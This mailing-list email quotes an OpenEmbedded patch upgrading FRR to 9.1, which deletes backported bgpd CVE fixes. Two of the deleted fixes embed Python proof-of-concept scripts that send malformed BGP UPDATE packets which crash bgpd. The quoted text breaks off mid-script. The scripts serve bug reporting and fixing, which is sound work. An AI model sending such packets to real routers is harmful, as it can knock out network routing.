Return-Path: <raj.khem@gmail.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from aws-us-west-2-korg-lkml-1.web.codeaurora.org (localhost.localdomain [127.0.0.1])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 76E7AC4167B
	for <webhook@archiver.kernel.org>; Tue, 28 Nov 2023 17:03:27 +0000 (UTC)
Received: from mail-oa1-f46.google.com (mail-oa1-f46.google.com [209.85.160.46])
 by mx.groups.io with SMTP id smtpd.web11.39126.1701191000643334151
 for <openembedded-devel@lists.openembedded.org>;
 Tue, 28 Nov 2023 09:03:20 -0800
Authentication-Results: mx.groups.io;
 dkim=pass header.i=@gmail.com header.s=20230601 header.b=V9h1+Fj4;
 spf=pass (domain: gmail.com, ip: 209.85.160.46, mailfrom: raj.khem@gmail.com)
Received: by mail-oa1-f46.google.com with SMTP id 586e51a60fabf-1f9decb7446so2890291fac.2
        for <openembedded-devel@lists.openembedded.org>; Tue, 28 Nov 2023 09:03:20 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1701191000; x=1701795800; darn=lists.openembedded.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=2UBiYO71ovRpRKV/2dag9peqvPEluYsaN41S1AikrWE=;
        b=V9h1+Fj4fMZwcdxLZj97yYHLaRJAx1tRP4klVlG1F0xajF1pMBL4q7zjFhIXnrg3co
         C7LUwh/NfBAIzphWMNkmOTvB/+WrLdSXFcPP/dUuTz/WMbl8cilfcou4rh4EO2BrBEra
         Ya7mR13nks9evigb8lwRPGNyLnokxMKiNumR3DaiAx4h2C55JjZWcWAz1QfvlYUyIjEe
         DGN+EajYqbwfjUndgytZjF/mtSVx/IQFTiUTAG8pSBAlS9B6qXRMHoqmTO1AldZoEpSo
         uMRkgfMYZLqC8G+4OZoZauxGlokr1LVaWZLZGkAjvqKd8gXQ/1HIshL6RNFSfewm7FyC
         HSwQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1701191000; x=1701795800;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=2UBiYO71ovRpRKV/2dag9peqvPEluYsaN41S1AikrWE=;
        b=Q68qINyhZi7dod+4X5oOpJbyyG9wvNjeeElkxcaRF2RlH9ISe7mtpG7D6SvvXDw1uY
         u7jAtqnfTfCglHwIALwvkH1VJReO+k2FfnHSr0RyRFGu6P/BVAOxtG7iIXlghVMY4KCw
         swYhDt7RTl3WJWuqIoN3IR8mlIRAzk1g+JU9wd3LFTrdnmgUw0N3deQ6+RCZ9Ydv4DH1
         06mpBivJt0p5dcdCAIvFllPaCkHZfTIk8UHT0gbMfSpPaWD8yWrXAwjG5BCVheKilz8V
         bkh2nBRFLKffL3imy3UXMXpugpdxsMV93Revl6JnHGD3sm6+IIlw0WqSikbLA5gbujNe
         CopA==
X-Gm-Message-State: AOJu0YwAaKGedSUmpMe2eg4h9uCb9QfMUNuJwYY/L+otUAwHp8LktChJ
	+xT7I0bXPFbiYP0kZ8d1lvFbpzfP0v+6Y+7WIgc=
X-Google-Smtp-Source: AGHT+IF5ekwdJLDXXkjew6XN7uLc2BKnUYcOpk+AEDGQtt+xa/53lkUBFfY0LzKjBMau8qJ93rlV9O9LGU8YasCuQaM=
X-Received: by 2002:a05:6870:63aa:b0:1ea:69f6:fe09 with SMTP id
 t42-20020a05687063aa00b001ea69f6fe09mr20825841oap.10.1701190999484; Tue, 28
 Nov 2023 09:03:19 -0800 (PST)
MIME-Version: 1.0
References: <1701159483-27786-1-git-send-email-wangmy@fujitsu.com>
In-Reply-To: <1701159483-27786-1-git-send-email-wangmy@fujitsu.com>
From: Khem Raj <raj.khem@gmail.com>
Date: Tue, 28 Nov 2023 09:02:53 -0800
Message-ID: <CAMKF1spPxFWxqDeH1Gvo2Z_hANKQ=Pv_szkTiVtTPN7mKOLmnw@mail.gmail.com>
Subject: Re: [oe] [meta-networking] [PATCH] frr: upgrade 9.0.1 -> 9.1
To: wangmy <wangmy@fujitsu.com>
Cc: openembedded-devel@lists.openembedded.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
List-Id: <openembedded-devel.lists.openembedded.org>
X-Webhook-Received: from li982-79.members.linode.com [45.33.32.79] by
 aws-us-west-2-korg-lkml-1.web.codeaurora.org with HTTPS for
 <openembedded-devel@lists.openembedded.org>; Tue, 28 Nov 2023 17:03:27 -0000
X-Groupsio-URL: https://lists.openembedded.org/g/openembedded-devel/message/107098

On Tue, Nov 28, 2023 at 12:18=E2=80=AFAM wangmy <wangmy@fujitsu.com> wrote:
>
> From: Wang Mingyu <wangmy@fujitsu.com>
>
> 0001-tools-make-quiet-actually-suppress-output.patch
> CVE-2023-46752.patch
> CVE-2023-46753.patch
> CVE-2023-47234.patch
> CVE-2023-47235.patch
> removed since they're included in 9.1
>
> Signed-off-by: Wang Mingyu <wangmy@fujitsu.com>
> ---
>  ...-make-quiet-actually-suppress-output.patch |  58 --------
>  .../frr/frr/CVE-2023-46752.patch              | 125 ------------------
>  .../frr/frr/CVE-2023-46753.patch              | 117 ----------------
>  .../frr/frr/CVE-2023-47234.patch              |  95 -------------
>  .../frr/frr/CVE-2023-47235.patch              | 112 ----------------
>  .../frr/{frr_9.0.1.bb =3D> frr_9.1.bb}          |   9 +-
>  6 files changed, 2 insertions(+), 514 deletions(-)
>  delete mode 100644 meta-networking/recipes-protocols/frr/frr/0001-tools-=
make-quiet-actually-suppress-output.patch
>  delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-46=
752.patch
>  delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-46=
753.patch
>  delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-47=
234.patch
>  delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-47=
235.patch
>  rename meta-networking/recipes-protocols/frr/{frr_9.0.1.bb =3D> frr_9.1.=
bb} (94%)
>
> diff --git a/meta-networking/recipes-protocols/frr/frr/0001-tools-make-qu=
iet-actually-suppress-output.patch b/meta-networking/recipes-protocols/frr/=
frr/0001-tools-make-quiet-actually-suppress-output.patch
> deleted file mode 100644
> index 3e93cf3c4..000000000
> --- a/meta-networking/recipes-protocols/frr/frr/0001-tools-make-quiet-act=
ually-suppress-output.patch
> +++ /dev/null
> @@ -1,58 +0,0 @@
> -From 312d5ee1592f8c5b616d330233d1de2643f759e2 Mon Sep 17 00:00:00 2001
> -From: Jonas Gorski <jonas.gorski@bisdn.de>
> -Date: Thu, 14 Sep 2023 17:04:16 +0200
> -Subject: [PATCH] tools: make --quiet actually suppress output
> -
> -When calling daemon_stop() with --quiet and e.g. the pidfile is empty,
> -it won't return early since while "$fail" is set, "$2" is "--quiet", so
> -the if condition isn't met and it will continue executing, resulting
> -in error messages in the log:
> -
> -> Sep 14 14:48:33 localhost watchfrr[2085]: [YFT0P-5Q5YX] Forked backgro=
und command [pid 2086]: /usr/lib/frr/watchfrr.sh restart all
> -> Sep 14 14:48:33 localhost frrinit.sh[2075]: /usr/lib/frr/frrcommon.sh:=
 line 216: kill: `': not a pid or valid job spec
> -> Sep 14 14:48:33 localhost frrinit.sh[2075]: /usr/lib/frr/frrcommon.sh:=
 line 216: kill: `': not a pid or valid job spec
> -> Sep 14 14:48:33 localhost frrinit.sh[2075]: /usr/lib/frr/frrcommon.sh:=
 line 216: kill: `': not a pid or valid job spec
> -
> -Fix this by moving the --quiet check into the block to log_failure_msg()=
,
> -and also add the check to all other invocations of log_*_msg() to make
> ---quiet properly suppress output.
> -
> -Fixes: 19a99d89f088 ("tools: suppress unuseful warnings during restartin=
g frr")
> -Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
> -Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/312d5=
ee1592f8c5b616d330233d1de2643f759e2]
> ----
> - tools/frrcommon.sh.in | 8 ++++----
> - 1 file changed, 4 insertions(+), 4 deletions(-)
> -
> -diff --git a/tools/frrcommon.sh.in b/tools/frrcommon.sh.in
> -index f1f70119097e..00b63a78e2bc 100755
> ---- a/tools/frrcommon.sh.in
> -+++ b/tools/frrcommon.sh.in
> -@@ -207,8 +207,8 @@ daemon_stop() {
> -       [ -z "$fail" -a -z "$pid" ] && fail=3D"pid file is empty"
> -       [ -n "$fail" ] || kill -0 "$pid" 2>/dev/null || fail=3D"pid $pid =
not running"
> -
> --      if [ -n "$fail" ] && [ "$2" !=3D "--quiet" ]; then
> --              log_failure_msg "Cannot stop $dmninst: $fail"
> -+      if [ -n "$fail" ]; then
> -+              [ "$2" =3D "--quiet" ] || log_failure_msg "Cannot stop $d=
mninst: $fail"
> -               return 1
> -       fi
> -
> -@@ -220,11 +220,11 @@ daemon_stop() {
> -               [ $(( cnt -=3D 1 )) -gt 0 ] || break
> -       done
> -       if kill -0 "$pid" 2>/dev/null; then
> --              log_failure_msg "Failed to stop $dmninst, pid $pid still =
running"
> -+              [ "$2" =3D "--quiet" ] || log_failure_msg "Failed to stop=
 $dmninst, pid $pid still running"
> -               still_running=3D1
> -               return 1
> -       else
> --              log_success_msg "Stopped $dmninst"
> -+              [ "$2" =3D "--quiet" ] || log_success_msg "Stopped $dmnin=
st"
> -               rm -f "$pidfile"
> -               return 0
> -       fi
> ---
> -2.42.0
> -
> diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.pat=
ch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
> deleted file mode 100644
> index e1f30248c..000000000
> --- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
> +++ /dev/null
> @@ -1,125 +0,0 @@
> -From b08afc81c60607a4f736f418f2e3eb06087f1a35 Mon Sep 17 00:00:00 2001
> -From: Donatas Abraitis <donatas@opensourcerouting.org>
> -Date: Fri, 20 Oct 2023 17:49:18 +0300
> -Subject: [PATCH] bgpd: Handle MP_REACH_NLRI malformed packets with sessi=
on
> - reset
> -
> -Avoid crashing bgpd.
> -
> -```
> -(gdb)
> -bgp_mp_reach_parse (args=3D<optimized out>, mp_update=3D0x7fffffffe140) =
at bgpd/bgp_attr.c:2341
> -2341                   stream_get(&attr->mp_nexthop_global, s, IPV6_MAX_=
BYTELEN);
> -(gdb)
> -stream_get (dst=3D0x7fffffffe1ac, s=3D0x7ffff0006e80, size=3D16) at lib/=
stream.c:320
> -320    {
> -(gdb)
> -321            STREAM_VERIFY_SANE(s);
> -(gdb)
> -323            if (STREAM_READABLE(s) < size) {
> -(gdb)
> -34       return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__=
dest));
> -(gdb)
> -
> -Thread 1 "bgpd" received signal SIGSEGV, Segmentation fault.
> -0x00005555556e37be in route_set_aspath_prepend (rule=3D0x555555aac0d0, p=
refix=3D0x7fffffffe050,
> -    object=3D0x7fffffffdb00) at bgpd/bgp_routemap.c:2282
> -2282           if (path->attr->aspath->refcnt)
> -(gdb)
> -```
> -
> -With the configuration:
> -
> -```
> - neighbor 127.0.0.1 remote-as external
> - neighbor 127.0.0.1 passive
> - neighbor 127.0.0.1 ebgp-multihop
> - neighbor 127.0.0.1 disable-connected-check
> - neighbor 127.0.0.1 update-source 127.0.0.2
> - neighbor 127.0.0.1 timers 3 90
> - neighbor 127.0.0.1 timers connect 1
> - address-family ipv4 unicast
> -  redistribute connected
> -  neighbor 127.0.0.1 default-originate
> -  neighbor 127.0.0.1 route-map RM_IN in
> - exit-address-family
> -!
> -route-map RM_IN permit 10
> - set as-path prepend 200
> -exit
> -```
> -
> -Reported-by: Iggy Frankovic <iggyfran@amazon.com>
> -Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
> -Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/b08af=
c81c60607a4f736f418f2e3eb06087f1a35]
> -CVE: CVE-2023-46752
> -Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
> ----
> - bgpd/bgp_attr.c   | 6 +-----
> - bgpd/bgp_attr.h   | 1 -
> - bgpd/bgp_packet.c | 6 +-----
> - 3 files changed, 2 insertions(+), 11 deletions(-)
> -
> -diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
> -index 6925aff727e2..e7bb42a5d989 100644
> ---- a/bgpd/bgp_attr.c
> -+++ b/bgpd/bgp_attr.c
> -@@ -2421,7 +2421,7 @@ int bgp_mp_reach_parse(struct bgp_attr_parser_args=
 *args,
> -
> -               mp_update->afi =3D afi;
> -               mp_update->safi =3D safi;
> --              return BGP_ATTR_PARSE_EOR;
> -+              return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATT=
R, 0);
> -       }
> -
> -       mp_update->afi =3D afi;
> -@@ -3759,10 +3759,6 @@ enum bgp_attr_parse_ret bgp_attr_parse(struct pee=
r *peer, struct attr *attr,
> -                       goto done;
> -               }
> -
> --              if (ret =3D=3D BGP_ATTR_PARSE_EOR) {
> --                      goto done;
> --              }
> --
> -               if (ret =3D=3D BGP_ATTR_PARSE_ERROR) {
> -                       flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,
> -                                 "%s: Attribute %s, parse error", peer->=
host,
> -diff --git a/bgpd/bgp_attr.h b/bgpd/bgp_attr.h
> -index 961e5f122470..fc347e7a1b4b 100644
> ---- a/bgpd/bgp_attr.h
> -+++ b/bgpd/bgp_attr.h
> -@@ -364,7 +364,6 @@ enum bgp_attr_parse_ret {
> -       /* only used internally, send notify + convert to BGP_ATTR_PARSE_=
ERROR
> -        */
> -       BGP_ATTR_PARSE_ERROR_NOTIFYPLS =3D -3,
> --      BGP_ATTR_PARSE_EOR =3D -4,
> - };
> -
> - struct bpacket_attr_vec_arr;
> -diff --git a/bgpd/bgp_packet.c b/bgpd/bgp_packet.c
> -index b585591e2f69..5ecf343b6657 100644
> ---- a/bgpd/bgp_packet.c
> -+++ b/bgpd/bgp_packet.c
> -@@ -2397,8 +2397,7 @@ static int bgp_update_receive(struct peer_connecti=
on *connection,
> -        * Non-MP IPv4/Unicast EoR is a completely empty UPDATE
> -        * and MP EoR should have only an empty MP_UNREACH
> -        */
> --      if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length=
 =3D=3D 0)
> --          || (attr_parse_ret =3D=3D BGP_ATTR_PARSE_EOR)) {
> -+      if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length =
=3D=3D 0) {
> -               afi_t afi =3D 0;
> -               safi_t safi;
> -               struct graceful_restart_info *gr_info;
> -@@ -2419,9 +2418,6 @@ static int bgp_update_receive(struct peer_connecti=
on *connection,
> -                          && nlris[NLRI_MP_WITHDRAW].length =3D=3D 0) {
> -                       afi =3D nlris[NLRI_MP_WITHDRAW].afi;
> -                       safi =3D nlris[NLRI_MP_WITHDRAW].safi;
> --              } else if (attr_parse_ret =3D=3D BGP_ATTR_PARSE_EOR) {
> --                      afi =3D nlris[NLRI_MP_UPDATE].afi;
> --                      safi =3D nlris[NLRI_MP_UPDATE].safi;
> -               }
> -
> -               if (afi && peer->afc[afi][safi]) {
> ---
> -2.42.1
> -
> diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.pat=
ch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
> deleted file mode 100644
> index 6bf159aba..000000000
> --- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
> +++ /dev/null
> @@ -1,117 +0,0 @@
> -From d8482bf011cb2b173e85b65b4bf3d5061250cdb9 Mon Sep 17 00:00:00 2001
> -From: Donatas Abraitis <donatas@opensourcerouting.org>
> -Date: Mon, 23 Oct 2023 23:34:10 +0300
> -Subject: [PATCH] bgpd: Check mandatory attributes more carefully for UPD=
ATE
> - message
> -
> -If we send a crafted BGP UPDATE message without mandatory attributes, we=
 do
> -not check if the length of the path attributes is zero or not. We only c=
heck
> -if attr->flag is at least set or not. Imagine we send only unknown trans=
it
> -attribute, then attr->flag is always 0. Also, this is true only if grace=
ful-restart
> -capability is received.
> -
> -A crash:
> -
> -```
> -bgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type =
31, length 16)
> -bgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrl=
en 20 alen 17
> -BGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375=
b4a); aborting...
> -BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f=
3205ca939d]
> -BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]
> -BGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]
> -BGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff39=
80]
> -BGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]
> -BGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f32=
05cd1290]
> -BGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]
> -BGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]
> -BGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]
> -BGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]
> -BGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]
> -BGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]
> -BGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]
> -BGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]
> -```
> -
> -Sending:
> -
> -```
> -import socket
> -import time
> -
> -OPEN =3D (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
> -b"\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02"
> -b"\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02"
> -b"\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00"
> -b"\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d"
> -b"\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01"
> -b"\x80\x00\x00\x00")
> -
> -KEEPALIVE =3D (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
> -b"\xff\xff\xff\xff\xff\xff\x00\x13\x04")
> -
> -UPDATE =3D bytearray.fromhex("ffffffffffffffffffffffffffffffff003c020000=
0014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000=
000")
> -
> -s =3D socket.socket(socket.AF_INET, socket.SOCK_STREAM)
> -s.connect(('127.0.0.2', 179))
> -s.send(OPEN)
> -data =3D s.recv(1024)
> -s.send(KEEPALIVE)
> -data =3D s.recv(1024)
> -s.send(UPDATE)
> -data =3D s.recv(1024)
> -time.sleep(1000)
> -s.close()
> -```
> -
> -Reported-by: Iggy Frankovic <iggyfran@amazon.com>
> -Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
> -Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/d8482=
bf011cb2b173e85b65b4bf3d5061250cdb9]
> -CVE: CVE-2023-46753
> -Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
> ----
> - bgpd/bgp_attr.c | 10 ++++++----
> - 1 file changed, 6 insertions(+), 4 deletions(-)
> -
> -diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
> -index e7bb42a5d989..cf2dbe65b805 100644
> ---- a/bgpd/bgp_attr.c
> -+++ b/bgpd/bgp_attr.c
> -@@ -3385,13 +3385,15 @@ bgp_attr_unknown(struct bgp_attr_parser_args *ar=
gs)
> - }
> -
> - /* Well-known attribute check. */
> --static int bgp_attr_check(struct peer *peer, struct attr *attr)
> -+static int bgp_attr_check(struct peer *peer, struct attr *attr,
> -+                        bgp_size_t length)
> - {
> -       uint8_t type =3D 0;
> -
> -       /* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled a=
s an
> -        * empty UPDATE.  */
> --      if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)
> -+      if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
> -+          !length)
> -               return BGP_ATTR_PARSE_PROCEED;
> -
> -       /* "An UPDATE message that contains the MP_UNREACH_NLRI is not re=
quired
> -@@ -3443,7 +3445,7 @@ enum bgp_attr_parse_ret bgp_attr_parse(struct peer=
 *peer, struct attr *attr,
> -       enum bgp_attr_parse_ret ret;
> -       uint8_t flag =3D 0;
> -       uint8_t type =3D 0;
> --      bgp_size_t length;
> -+      bgp_size_t length =3D 0;
> -       uint8_t *startp, *endp;
> -       uint8_t *attr_endp;
> -       uint8_t seen[BGP_ATTR_BITMAP_SIZE];
> -@@ -3831,7 +3833,7 @@ enum bgp_attr_parse_ret bgp_attr_parse(struct peer=
 *peer, struct attr *attr,
> -       }
> -
> -       /* Check all mandatory well-known attributes are present */
> --      ret =3D bgp_attr_check(peer, attr);
> -+      ret =3D bgp_attr_check(peer, attr, length);
> -       if (ret < 0)
> -               goto done;
> -
> ---
> -2.42.1
> -
> diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.pat=
ch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
> deleted file mode 100644
> index 754f9345a..000000000
> --- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
> +++ /dev/null
> @@ -1,95 +0,0 @@
> -From c37119df45bbf4ef713bc10475af2ee06e12f3bf Mon Sep 17 00:00:00 2001
> -From: Donatas Abraitis <donatas@opensourcerouting.org>
> -Date: Sun, 29 Oct 2023 22:44:45 +0200
> -Subject: [PATCH] bgpd: Ignore handling NLRIs if we received MP_UNREACH_N=
LRI
> -
> -If we receive MP_UNREACH_NLRI, we should stop handling remaining NLRIs i=
f
> -no mandatory path attributes received.
> -
> -In other words, if MP_UNREACH_NLRI received, the remaining NLRIs should =
be handled
> -as a new data, but without mandatory attributes, it's a malformed packet=
.
> -
> -In normal case, this MUST not happen at all, but to avoid crashing bgpd,=
 we MUST
> -handle that.
> -
> -Reported-by: Iggy Frankovic <iggyfran@amazon.com>
> -Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
> -Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/c3711=
9df45bbf4ef713bc10475af2ee06e12f3bf]
> -CVE: CVE-2023-47234
> -Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
> ----
> - bgpd/bgp_attr.c   | 19 ++++++++++---------
> - bgpd/bgp_attr.h   |  1 +
> - bgpd/bgp_packet.c |  7 ++++++-
> - 3 files changed, 17 insertions(+), 10 deletions(-)
> -
> -diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
> -index 1473dc772502..75aa2ac7cce6 100644
> ---- a/bgpd/bgp_attr.c
> -+++ b/bgpd/bgp_attr.c
> -@@ -3399,15 +3399,6 @@ static int bgp_attr_check(struct peer *peer, stru=
ct attr *attr,
> -           !length)
> -               return BGP_ATTR_PARSE_WITHDRAW;
> -
> --      /* "An UPDATE message that contains the MP_UNREACH_NLRI is not re=
quired
> --         to carry any other path attributes.", though if MP_REACH_NLRI =
or NLRI
> --         are present, it should.  Check for any other attribute being p=
resent
> --         instead.
> --       */
> --      if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI=
)) &&
> --           CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLR=
I))))
> --              return BGP_ATTR_PARSE_PROCEED;
> --
> -       if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))
> -               type =3D BGP_ATTR_ORIGIN;
> -
> -@@ -3426,6 +3417,16 @@ static int bgp_attr_check(struct peer *peer, stru=
ct attr *attr,
> -           && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)=
))
> -               type =3D BGP_ATTR_LOCAL_PREF;
> -
> -+      /* An UPDATE message that contains the MP_UNREACH_NLRI is not req=
uired
> -+       * to carry any other path attributes. Though if MP_REACH_NLRI or=
 NLRI
> -+       * are present, it should. Check for any other attribute being pr=
esent
> -+       * instead.
> -+       */
> -+      if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)=
) &&
> -+          CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI=
)))
> -+              return type ? BGP_ATTR_PARSE_MISSING_MANDATORY
> -+                          : BGP_ATTR_PARSE_PROCEED;
> -+
> -       /* If any of the well-known mandatory attributes are not present
> -        * in an UPDATE message, then "treat-as-withdraw" MUST be used.
> -        */
> -diff --git a/bgpd/bgp_attr.h b/bgpd/bgp_attr.h
> -index fc347e7a1b4b..d30155e6dba0 100644
> ---- a/bgpd/bgp_attr.h
> -+++ b/bgpd/bgp_attr.h
> -@@ -364,6 +364,7 @@ enum bgp_attr_parse_ret {
> -       /* only used internally, send notify + convert to BGP_ATTR_PARSE_=
ERROR
> -        */
> -       BGP_ATTR_PARSE_ERROR_NOTIFYPLS =3D -3,
> -+      BGP_ATTR_PARSE_MISSING_MANDATORY =3D -4,
> - };
> -
> - struct bpacket_attr_vec_arr;
> -diff --git a/bgpd/bgp_packet.c b/bgpd/bgp_packet.c
> -index a7514a26aa64..5dc35157ebf6 100644
> ---- a/bgpd/bgp_packet.c
> -+++ b/bgpd/bgp_packet.c
> -@@ -2359,7 +2359,12 @@ static int bgp_update_receive(struct peer_connect=
ion *connection,
> -       /* Network Layer Reachability Information. */
> -       update_len =3D end - stream_pnt(s);
> -
> --      if (update_len && attribute_len) {
> -+      /* If we received MP_UNREACH_NLRI attribute, but also NLRIs, then
> -+       * NLRIs should be handled as a new data. Though, if we received
> -+       * NLRIs without mandatory attributes, they should be ignored.
> -+       */
> -+      if (update_len && attribute_len &&
> -+          attr_parse_ret !=3D BGP_ATTR_PARSE_MISSING_MANDATORY) {
> -               /* Set NLRI portion to structure. */
> -               nlris[NLRI_UPDATE].afi =3D AFI_IP;
> -               nlris[NLRI_UPDATE].safi =3D SAFI_UNICAST;
> ---
> -2.42.1
> -
> diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.pat=
ch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
> deleted file mode 100644
> index b06ba94a3..000000000
> --- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
> +++ /dev/null
> @@ -1,112 +0,0 @@
> -From 6814f2e0138a6ea5e1f83bdd9085d9a77999900b Mon Sep 17 00:00:00 2001
> -From: Donatas Abraitis <donatas@opensourcerouting.org>
> -Date: Fri, 27 Oct 2023 11:56:45 +0300
> -Subject: [PATCH] bgpd: Treat EOR as withdrawn to avoid unwanted handling=
 of
> - malformed attrs
> -
> -Treat-as-withdraw, otherwise if we just ignore it, we will pass it to be
> -processed as a normal UPDATE without mandatory attributes, that could le=
ad
> -to harmful behavior. In this case, a crash for route-maps with the confi=
guration
> -such as:
> -
> -```
> -router bgp 65001
> - no bgp ebgp-requires-policy
> - neighbor 127.0.0.1 remote-as external
> - neighbor 127.0.0.1 passive
> - neighbor 127.0.0.1 ebgp-multihop
> - neighbor 127.0.0.1 disable-connected-check
> - neighbor 127.0.0.1 update-source 127.0.0.2
> - neighbor 127.0.0.1 timers 3 90
> - neighbor 127.0.0.1 timers connect 1
> - !
> - address-family ipv4 unicast
> -  neighbor 127.0.0.1 addpath-tx-all-paths
> -  neighbor 127.0.0.1 default-originate
> -  neighbor 127.0.0.1 route-map RM_IN in
> - exit-address-family
> -exit
> -!
> -route-map RM_IN permit 10
> - set as-path prepend 200
> -exit
> -```
> -
> -Send a malformed optional transitive attribute:
> -
> -```
> -import socket
> -import time
> -
> -OPEN =3D (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
> -b"\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02"
> -b"\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02"
> -b"\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00"
> -b"\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d"
> -b"\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01"
> -b"\x80\x00\x00\x00")
> -
> -KEEPALIVE =3D (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
> -b"\xff\xff\xff\xff\xff\xff\x00\x13\x04")
> -
> -UPDATE =3D bytearray.fromhex("ffffffffffffffffffffffffffffffff002b020000=
0003c0ff00010100eb00ac100b0b001ad908ac100b0b")
> -
> -s =3D socket.socket(socket.AF_INET, socket.SOCK_STREAM)
> -s.connect(('127.0.0.2', 179))
> -s.send(OPEN)
> -data =3D s.recv(1024)
> -s.send(KEEPALIVE)
